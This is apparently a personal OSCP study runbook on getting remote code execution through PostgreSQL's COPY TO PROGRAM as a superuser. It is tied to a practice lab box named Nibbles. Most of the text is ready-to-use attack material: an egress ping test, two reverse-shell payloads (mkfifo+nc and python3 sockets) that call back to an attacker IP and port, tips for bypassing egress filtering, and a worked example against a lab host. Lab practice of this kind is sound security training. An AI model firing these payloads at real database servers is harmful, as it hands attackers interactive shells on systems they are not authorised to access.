---
tags: [oscp, postgresql, rce, runbook]
box_sources: [Nibbles]
---

# PostgreSQL — COPY TO PROGRAM RCE

*You are connected as a superuser. Use COPY TO PROGRAM to execute OS commands.*

---

## Key Facts

- `COPY TO PROGRAM` passes the command to `/bin/sh` via `popen()` — NOT bash
- On Debian/Ubuntu, `/bin/sh` is `dash` — bash-specific syntax (`>&`, `/dev/tcp`) will fail
- Use mkfifo+nc or python3 — both are POSIX-compatible
- PG Practice boxes: TCP egress filtered. Port 80 usually works. Test with ICMP first.

---

## Step 1 — Confirm Egress (Ping Test)

On Kali:
```bash
sudo tcpdump -i tun0 icmp
```

In psql:
```sql
COPY (SELECT '') TO PROGRAM 'ping -c 4 $LocalIP';
```

ICMP arrives = COPY TO PROGRAM executes. If no ICMP, something more fundamental is wrong.

---

## Step 2 — Fire Reverse Shell

| Payload | Works when | Notes |
|---|---|---|
| `COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc $LocalIP $Port >/tmp/f';` | nc installed, egress open on `$Port` | Most reliable. Try port 80 first on PG boxes. |
| `COPY (SELECT '') TO PROGRAM 'python3 -c "import socket,os,subprocess;s=socket.socket();s.connect((\"$LocalIP\",$Port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"';` | python3 installed | Fallback if nc is missing. |

---

## Troubleshooting

| Error | Likely cause | Fix |
|---|---|---|
| `child process exited with exit code 2` | Bash syntax (`>&`) passed to dash | Use mkfifo+nc, not `/dev/tcp` redirect |
| `child process exited with exit code 1` (mkfifo) | TCP egress filtered on that port | Try port 80 or 443 |
| `child process exited with exit code 1` (nc) | nc not installed | Use python3 payload |
| Ping arrives but no shell | Port filtered OR tool missing | Check tools via COPY FROM PROGRAM, try different port |

---

## Nibbles Example (PG Practice, port 80 bypass)

```bash
# Kali - listener
sudo nc -lvnp 80

# psql
COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.194 80 >/tmp/f';
```

Shell received as `postgres` OS user. Proceed to [[PrivEsc Linux - SUID]] (or [[PrivEsc Linux - Initial Enum]]).

---

## Module Links

[[10. SQL Injection Attacks]] | [[06. Information Gathering]]
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for reverse-shell selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for practical walkthrough searches
